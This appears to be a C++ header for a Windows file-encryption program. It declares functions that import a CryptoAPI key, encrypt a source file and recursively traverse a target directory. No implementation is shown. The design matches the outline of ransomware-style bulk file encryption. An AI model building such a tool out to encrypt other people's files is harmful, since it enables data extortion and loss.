#pragma once
#include <Windows.h>
#include <iostream>
#include "strsafe.h"
#include <string>

HCRYPTKEY keyimport();
int enkrypt(WCHAR* srcFile, HCRYPTKEY clé);
bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0);